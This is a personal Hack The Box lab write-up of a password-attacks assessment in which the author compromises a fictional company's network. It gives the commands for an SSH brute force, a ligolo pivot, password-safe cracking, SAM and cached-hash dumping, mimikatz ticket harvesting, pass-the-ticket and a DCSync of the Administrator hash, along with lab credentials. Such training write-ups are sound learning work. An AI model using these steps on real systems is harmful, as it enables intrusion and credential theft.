---
platform: hackthebox
difficulty: unknown
status: Completed
date: 2026-09-24
tags:
---
# HTB: Skills Assessment - Password Attacks

**Targets:** 

| Host-Name  | IP-Addresses                                        |
| ---------- | --------------------------------------------------- |
| **DMZ01**  | `10.129.*.*` (External), `172.16.119.13` (Internal) |
| **JUMP01** | `172.16.119.7`                                      |
| **FILE01** | `172.16.119.10`                                     |
| **DC01**   | `172.16.119.11`                                     |

---

## 01 - Scope
### Assignment:
`Betty Jayde` works at `Nexura LLC`. We know she uses the password `Texas123!@#` on multiple websites, and we believe she may reuse it at work. Infiltrate Nexura's network and gain command execution on the domain controller.
#### Pivoting Primer

The internal hosts (`JUMP01`, `FILE01`, `DC01`) reside on a private subnet that is not directly accessible from our attack host. The only externally reachable system is `DMZ01`, which has a second interface connected to the internal network. This segmentation reflects a classic DMZ setup, where public-facing services are isolated from internal infrastructure.

To access these internal systems, we must first gain a foothold on `DMZ01`. From there, we can `pivot` — that is, route our traffic through the compromised host into the private network. This enables our tools to communicate with internal hosts as if they were directly accessible. After compromising the DMZ, refer to the module `cheatsheet` for the necessary commands to set up the pivot and continue your assessment.
### Objectives:
- **Primary Goals:**
  - [x] What is the NTLM hash of NEXURA\Administrator?
  `36e09e1e6ade94d63fbcab5e5b8d6d23`

---

## 02 - Procedure
1. First I tried to figure out which OS and services are running on the `DMZ01` :
```bash
nmap -p- --min-rate 500 --max-retries 1 -v -n 10.129.234.116 > default-nmap
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924081637.png)

2. Since only `SSH` is open (thus rdp is not available) and we probably have vaild credentials, I tried to connect to it, with trying some username-variations manually (without success):
```bash
ssh betty@10.129.234.116 
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924084215.png)

3. Since I couldn't figure out the username manually, I created a `userlist` with `username-anarchy` and bruteforced ssh:
```bash
/run/media/breezy/PortableSSD/THM/Scripts/username-anarchy/username-anarchy -i name > user.list 
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924084802.png)

```bash
hydra -L user.list -p 'Texas123!@#' -f ssh://10.129.234.116 
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924085034.png)

4. I then uploaded `linpeas.sh` over a `python webserver` hosted on my attack box and executed it: 
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924085544.png)

5. `Linpeas` found a bunch of interesting information, but most importantly:
	- Potential `credentials` for the fileserver `file01`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924090556.png)

6. Although linpeas has found a number of CVEs, including privilege escalation, it's currently more worthwhile to simply use the host as a pivot to gain access to the file server.

7. I therefor uploaded the `ligolo-agent` to the host `DMZ01` (again over a python webserver), started the `ligolo listener` on my attack box and connected back to it (I started the process in the background, so that the ssh terminal doesn't get blocked):
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924093006.png)
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924093020.png)

8. I then added a route to the target network `172.16.119.0/24`:
```bash
sudo ip route add 172.16.119.0/24 dev ligolo
```

9. I then checked if `SSH` or `RDP` are open on the hosts `FILE01` and `JUMP01`. Only `RDP is open` (Which is odd, since there where commands for ssh to the host FILE01. Maybe ssh is open, but only from the Jumphost....) and SSH is probably blocked by a firewall. 
```bash
nmap --unprivileged -sT -Pn -p 22 172.16.119.10
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924095324.png)

10. I tried to connect to `FILE01` and `JUMP01` with the users `jbetty` and `hwilliam` and Bingo! The credentials of `hwilliam` worked to login to `JUMP01` and even better, it's his domain-credentials:
```bash
xfreerdp /v:172.16.119.7 /u:hwilliam /p:'dealer-screwed-gym1' /dynamic-resolution /cert:ignore
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924102533.png)

11. After checking out the `File Explorer` it was clear, that the next target will be `FILE01`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924103018.png)

12. I found an old `password database` which can probably be opened by the password tool `Password Safe 3` on the desktop. But we will need the `Master Password` first:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924103817.png)

13. Since there are a lot of files on the share I automated the credential enumeration with `Snaffler.exe` which I copy pasted to the target:
```cmd
Snaffler.exe -s -m "C:\temp\loot" -o "C:\temp\snaffler.log"
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924110416.png)

15. After spending to much time searching for the `master password`, I decided to upload `winPEAS` and enumerate the system further. That's where I found:
- We have full permissions to the `taskmanager` which allows us to execute e.g. the cmd as `NT AUTHORITY\SYSTEM`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924122523.png)
- A bunch of `critical CVE's`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924130117.png)

15. After a lot of trial and error of creating/overwriting a scheduled task. Which should execute after user login and create a new local admin user, I walked into a dead end. I looked up a walktrough and learnt, that it is possible to decrypt the `password safe` with `johntheripper` . So this is what I did:
```bash
pwsafe2john Employee-Passwords_OLD.psafe3 > hash.txt
```

```bash
john  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924181231.png)

17. I then connected to the `Password Safe 3` and retrieved following credentials:
`jbetty`
```password
xiao-nicer-wheels5
```

`bdavid`
```password
caramel-cigars-reply1
```

`stom`
```password
fails-nibble-disturb4
```

`hwilliam`
```password
warned-wobble-occur8
```

18. Only the credentials of `bdavid` were still valid. I first tried to login to the `DC` directly, but he's not authorized.
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924182013.png)

19. I therefor connected to the `JUMP01` again, but this time with `bdavid`. The advantage now is, that he has `local admin rights`:
```bash
xfreerdp /v:172.16.119.7 /u:bdavid /p:'caramel-cigars-reply1' /dynamic-resolution /cert:ignore
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924183155.png)

20. I also checked the other `userprofiles` on the `JUMP01` and could only find an `RDP-file` to the localhost on the desktop of `stom`, which wasn't useful (since the login wasn't saved):
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924184219.png)

21. I then exported the `SAM-DB Hive`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924184649.png)

22. I transferred it as a `zip file` and retrieved the `hashes`:
```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924185212.png)

23. I then tried to bruteforce the missing `DCC2` domain cached Credentials (without success):
```bash
hashcat -m 2100 '$DCC2$10240#Administrator#10c34f0413c282fbc37de4ee4bb75360' /usr/share/wordlists/rockyou.txt
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924190018.png)

```bash
hashcat -m 2100 '$DCC2$10240#stom#45be3457faea629d93f95f5ab59ae683' /usr/share/wordlists/rockyou.txt
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260924190248.png)

```bash
hashcat -m 2100 '$DCC2$10240#Administrator#10c34f0413c282fbc37de4ee4bb75360' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule

```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260925081415.png)


24. I then tried bruteforcing the `local Admininstrator` but also without success:
```bash
hashcat -m 1000 local /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260925081609.png)

25. Now I extracted the `Ticket Granting Tickets` with the user `bdavid` (who has local adminrights) and the tool `mimikatz.exe`...
```cmd
mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit > ticketharvest.txt
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260925090718.png)

26. Afterwards I copied the `TGT` of `stom` (who is the only user missing) to my local attack box, converted it to the linux ticket format `ccache` and loaded it into the `ccache environmental variable`:
```bash
impacket-ticketConverter '[0;40fbe]-2-0-40e10000-stom@krbtgt-NEXURA.HTB.kirbi' krb5cc_stom                             
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260925091110.png)

```bash
export KRB5CCNAME="FILE:/tmp/krb5cc_stom"
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260925091258.png)

27. I then tried to connect to the `DC01` and `JUMP01` but it didn't work (because xfreerdp couldn't find the `Key Distrbution Center`):
```bash
xfreerdp /v:JUMP01.NEXURA.HTB /u:stom /d:NEXURA.HTB /kerberos:cache:"/tmp/krb5cc_stom" /cert:ignore
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260925092635.png)


22. So I added the `KDC` and other needed parameters to the `/etc/krb5.conf` file. One problem less, but the authentication still fails on the empty password in xfreerdp:
```/etc/krb5.conf
[libdefaults]
    default_realm = NEXURA.HTB
    dns_lookup_kdc = false

[realms]
    NEXURA.HTB = {
        kdc = DC01.NEXURA.HTB
        admin_server = DC01.NEXURA.HTB
    }

[domain_realm]
    .nexura.htb = NEXURA.HTB
    nexura.htb = NEXURA.HTB
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260925093417.png)

23. Since RDP with `stom` would be nice to have but not crucial I continued with SMB (because there is still his private folder and the folder "management", which could contain something). I executed `Pass the Ticket` inside the RDP-session with local admin rights with `rubeus.exe`:
```cmd
Rubeus.exe ptt /ticket:[0;40fbe]-2-0-40e10000-stom@krbtgt-NEXURA.HTB.kirbi
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260925100831.png)

24. As we can see from the output above, both folders `stom` and `management` are empty. After checking a walktrough I learnt, that `mimikatz` is actually more powerful, than I anticipated. Since it not only reads the tickets but can also decrypt passwords. So I checked the "ticketharvest" file from the previous execution and there it was:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260925101456.png)

25. And like that we obtained credentials vaild for RDP to the server`DC01`. He's not just any user he's actually a `domain administrator`.:
```xfreerdp /v:172.16.119.11 /u:stom /p:'calves-warp-learning1' /dynamic-resolution /cert:ignore
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260925101917.png)


26. From here on it was basically rinse and repeat. I dumped the `NTDS.DIT` with mimikatz and retrieved the `NTLM Hash`:
```bash
mimikatz "lsadump::dcsync /domain:NEXURA.HTB /user:Administrator" exit
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260925104737.png)



## 03 - Lesson Learned
1. I've noticed that the topic of Windows passwords isn't very intuitive yet. I hope to improve this in the main chapter, “Active Directory Enumeration & Attacks.”
2. It's worth trying to bruteforce "masterkeys" of Password Safes. 